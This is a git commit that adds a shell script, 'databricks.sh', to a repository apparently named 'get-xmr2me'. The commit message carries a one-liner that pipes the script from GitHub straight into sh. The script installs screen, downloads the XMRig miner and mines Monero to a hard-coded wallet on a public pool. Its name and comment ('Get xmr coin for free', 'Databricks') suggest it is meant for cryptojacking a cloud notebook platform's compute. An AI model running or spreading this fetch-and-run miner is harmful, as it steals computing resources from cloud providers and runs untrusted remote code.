d67d1a24c614a7b2689f5c991bf2aa1c41c93293
aabu3572 <107196414+aabu3572@users.noreply.github.com>
2022-06-10 01:40:33 +0400

    Add files via upload
    cd /root
    curl https://raw.githubusercontent.com/aabu3572/get-xmr2me/main/databricks.sh | sh

---
+++ databricks.sh
@@ -0,0 +1,12 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
+tar xvzf xmrig-6.17.0-linux-x64.tar.gz
+cd xmrig-6.17.0
+./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 48fb6CwXF6U2sYiaU6t9PUf9Hirpg1PwpUy5pJ1xp7d5XprW6XHmnFvRTAUQCefMCVMnXbVM6S6VkLzeRyiSjreSNhk9UVt.XMR00PcFF -p x
